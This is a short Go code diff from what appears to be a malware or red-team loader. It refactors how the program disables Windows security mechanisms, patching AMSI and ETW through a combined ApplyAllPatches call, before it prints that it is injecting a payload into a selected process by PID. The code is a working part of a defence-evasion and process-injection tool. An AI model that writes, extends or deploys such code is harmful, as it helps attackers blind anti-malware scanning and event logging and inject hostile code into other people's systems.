@@ -657,26 +657,19 @@ func main() {
 	
 	// Apply security patches before injection
 	fmt.Println("Disabling security mechanisms...")
+	successful, failed := winapi.ApplyAllPatches()
 	
-	// Patch AMSI (Anti-Malware Scan Interface)
-	fmt.Print("Patching AMSI... ")
-	if err := winapi.PatchAMSI(); err != nil {
-		fmt.Printf(" FAILED: %v\n", err)
-		// Don't exit on AMSI failure - continue with ETW patch
-	} else {
-		fmt.Println(" SUCCESS")
+	// Report patch results
+	for _, name := range successful {
+		fmt.Printf("Patching %s... SUCCESS\n", name)
+	}
+	for name, err := range failed {
+		fmt.Printf("Patching %s... FAILED: %v\n", name, err)
 	}
 	
-	// Patch ETW (Event Tracing for Windows)
-	fmt.Print("Patching ETW... ")
-	if err := winapi.PatchETW(); err != nil {
-		fmt.Printf(" FAILED: %v\n", err)
-		// Don't exit on ETW failure - continue with injection
-	} else {
-		fmt.Println(" SUCCESS")
+	if len(successful) > 0 {
+		fmt.Printf("Successfully applied %d/%d security patches\n", len(successful), len(successful)+len(failed))
 	}
-	
-	fmt.Println() // Empty line for better readability
 	
 	// Perform the injection
 	fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
